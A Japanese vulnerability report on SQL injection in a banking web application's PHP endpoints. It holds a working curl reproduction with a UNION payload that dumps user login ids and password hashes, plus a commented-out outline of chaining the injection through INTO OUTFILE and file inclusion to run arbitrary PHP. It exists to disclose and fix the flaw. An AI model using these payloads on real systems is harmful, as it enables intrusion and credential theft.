## 想定されていないSQLを実行し、任意のPHPを実行される脆弱性
### 対象
httpリクエストにてSQLインジェクションが可能なエンドポイント
* `activate.php` (条件あり: 送信元IP)
* `banklist.php` 
* `branchlist.php`
* `hidden_server.php` (条件あり: 送信元IP)
* `login.php`
* `passbook.php` (条件あり: 有効なセッションがあること)
* `transactionlist.php` (条件あり: 有効なセッションがあること)
* `transfer.php` (条件あり: 有効なセッションがあること)
* `user.php`  (条件あり: 有効なセッションがあること)
* `verify.php` (条件あり: 有効なセッションがあること)

### 危険度
High
* 想定される被害・影響が非常に大きく、容易に実行できるため

### 解説
このプログラムは、Http request bodyから受け取った文字列をSQL文に挿入することでSQLを実行している。
しかし、処理に不備がありエスケープせずにSQLを実行する為、SQLインジェクション攻撃が可能である。
<!--また、DBサーバのセキュリティ設定が甘いため、SQLインジェクション攻撃を用いて
任意のPHPプログラムをmysqlのグローバルセッティング`secure_file_priv`にて許可されている`/var/lib/mysql-files/`以下に
`INTO OUTFILE`構文を用いてphpファイルを出力することで
login.phpにてLFI(Local File Inclusion)攻撃にて任意のPHPを実行することができる。-->


### 再現方法
#### UNION句を使ったデータの取得
以下のコマンドを実行することでbranchlistを使って任意のデータを取得することができる

```sh
curl -X POST http://${SERVER_IP}/ \
  -F mode=branchlist \
  -F "JSON={\"bank_code\":\"' UNION ALL SELECT id, loginid, password, name_mei FROM users;--\"}'
```

結果
```json
{
    "branch": [
        {
            "bank_code": "mbsd001", 
            "code": "晶夫", 
            "id": "1", 
            "name": "$2y$10$RpbLdohNKvjeRzUUKdVW0eIUXZNEI7x4JqjWIV6mncTOIx484K7NO"
        }
    ], 
    "msg": "ok"
}
```


### 条件
特になし

### 想定される被害・影響
* DBデータの不正入手
* 任意のSQL文の実行
  * 追加
  * 更新
  * 削除

### 対策
* sqlを実行する前に、エスケープを行うかプリペアードステートメントを利用するようにプログラムを修正する
